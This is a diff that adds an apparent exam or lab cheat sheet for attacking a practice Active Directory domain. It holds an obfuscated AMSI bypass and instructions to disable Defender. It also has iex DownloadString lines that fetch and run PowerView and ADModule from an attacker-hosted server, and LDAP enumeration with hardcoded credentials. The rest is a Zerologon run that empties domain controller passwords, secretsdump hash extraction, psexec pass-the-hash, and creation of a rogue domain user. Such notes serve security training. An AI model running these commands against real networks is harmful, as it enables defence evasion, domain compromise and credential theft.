@@ -1,0 +1,102 @@
+AMSI BYPASS, ADMODULE, POWERVIEW      
+
+hot to log into domain controller on the login page on windows>>> NORTH\robb.stark
+-----------------------------------------------------------------------------------------------------------------------------------------------
+Kali:
+mkdir -p /home/kali/examserver
+cd /home/kali/examserver
+
+wget https://github.com/samratashok/ADModule/archive/refs/heads/master.zip
+wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1 -O powerview.ps1
+sudo python3 -m http.server 80
+
+
+Windows Powershell instance 1:
+//////////////////////////////////////////////////////
+//////DONT USE THIS WONT WORK, USE COMMAND BELOW//////
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+//////////////////////////////////////////////////////
+
+[ReF]."`A$(echo sse)`mB$(echo L)`Y"."g`E$(echo tty)p`E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils" -f'iUt','gement.A',"on.Am`s",'stem.M','oma') )."$(echo ge)`Tf`i$(echo El)D"(("{0}{2}ni{1}iled" -f'am','tFa',"`siI"),("{2}ubl{0}`,{1}{0}" -f 'ic','Stat','NonP'))."$(echo Se)t`Va$(echo LUE)"($(),$(1 -eq 1))
+Set-ExecutionPolicy -Scope CurrentUser Unrestricted -verbose
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+///////////////////////THE CODE MARKED WITH / FROM HERE TILL IMPORT MODULE IS DEPRECATED, THE NEXT COMMAND SHOULD BE THE "iex...;import-activedirectory" ONE////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+New-Item -ItemType Directory -Path "C:\Users\robb.stark\Desktop\ADModule" -Force
+Invoke-WebRequest -Uri "http://192.168.56.5/master.zip" -OutFile "C:\Users\robb.stark\Desktop\ADModule\ADModule.zip"
+
+!!!!!go into windows and disable defender (DISABLE REAL TIME PROTECTION IF IF POPS UP in > virus and threat protection > under the virus & threat protection settings click "manage settings" > turn off real time protection)
+
+Expand-Archive -Path "C:\Users\robb.stark\Desktop\ADModule\ADModule.zip" -DestinationPath "C:\Users\robb.stark\Desktop\ADModule-master"
+Get-ChildItem -Path "C:\Users\robb.stark\Desktop\ADModule-master" -Recurse | Unblock-File -verbose
+Import-Module "C:\Users\robb.stark\Desktop\ADModule-master\Microsoft.ActiveDirectory.Management.dll" -verbose
+Import-Module "C:\Users\robb.stark\Desktop\ADModule-master\ActiveDirectory\ActiveDirectory.psd1" -verbose
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+iex (new-Object Net.WebClient).DownloadString("http://192.168.56.5/ADModule/ADModule-master/Import-ActiveDirectory.ps1");Import-ActiveDirectory
+Get-ADDomain
+
+Windows Powershell instance 2:
+iex (New-Object Net.WebClient).DownloadString("http://192.168.56.5/powerview.ps1")
+Get-NetDomain
+-----------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+LDAP SEARCHES
+-----------------------------------------------------------------------------------------------------------------------------------------------
+kali:
+#task 1
+ldapsearch -x -H ldap://192.168.56.10 -s base
+#task 2
+ldapsearch -LLL -H ldap://192.168.56.10 -D "domain_administrator@sevenkingdoms.local" -w "domain_administrator" -b "DC=sevenkingdoms,DC=local" "(objectClass=*)" sAMAccountName
+#task 3
+ldapsearch -LLL -H ldap://192.168.56.10 -D "domain_administrator@sevenkingdoms.local" -w "domain_administrator" -b "DC=sevenkingdoms,DC=local" "(objectClass=*)" memberof | grep -i memberof
+#task 3
+ldapsearch -LLL -H ldap://192.168.56.10 -D "domain_administrator@sevenkingdoms.local" -w "domain_administrator" -b "DC=sevenkingdoms,DC=local" "(&(objectClass=*)(memberof:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=sevenkingdoms,DC=local))" sAMAccountName | grep sAMAccountName
+-----------------------------------------------------------------------------------------------------------------------------------------------
+
+
+ZERO LOGON
+-----------------------------------------------------------------------------------------------------------------------------------------------
+kali:
+cd /home/kali/examserver
+git clone https://github.com/risksense/zerologon.git
+cd zerologon
+
+python3 set_empty_pw.py CASTELBLACK 192.168.56.22    # If error, not a DC.
+python3 set_empty_pw.py KINGSLANDING 192.168.56.10       
+python3 set_empty_pw.py WINTERFELL 192.168.56.11  
+python3 set_empty_pw.py MEEREEN 192.168.56.12  # This one works!
+
+
+
+
+Extracting Hash with impacket-secretsdump
+Note: You need to capture the new admin hash (the second value from the semicolon).
+
+impacket-secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'ESSOS/MEEREEN$@192.168.56.12' > secret_hashes.txt
+
+
+
+Remote Execution with impacket-psexec
+Note: Use the hash (replace <NEW_ADMIN_HASH> with the extracted value) to execute commands remotely:
+
+impacket-psexec -hashes aad3b43...<NEW_ADMIN_HASH>... 'administrator@192.168.56.12'
+
+
+
+Creating a New AD User
+Using the ADModule (or similar AD tools) to add a user. Adjust the OU/domain as needed.
+
+///example/// new-aduser -name "Bill Stackpole" -GivenName "Bill" -Surname "Stackpole" SamAccountName "bstax" -UserPrincipalName "bstax@example.com" -Path "OU=Users,DC=example,DC=com" -AccountPassword (ConvertTo-securestring "Password_F1" -AsPlainText -force) -enabled $true
+New-ADUser -Server 192.168.56.11 -Name "Naor Golan" -GivenName "Naor" -Surname "Golan" -SamAccountName "ngolan" -UserPrincipalName "ngolan@north.sevenkingdoms.local" -Path "OU=Users,DC=north,DC=sevenkingdoms,DC=local" -AccountPassword (ConvertTo-SecureString "Password_F1" -AsPlainText -Force) -Enabled $true
+
+
+
+(optional, may not work)
+python3 restore_password.py CASTELBLACK 192.168.56.22 <NEW_PASSWORD>
+
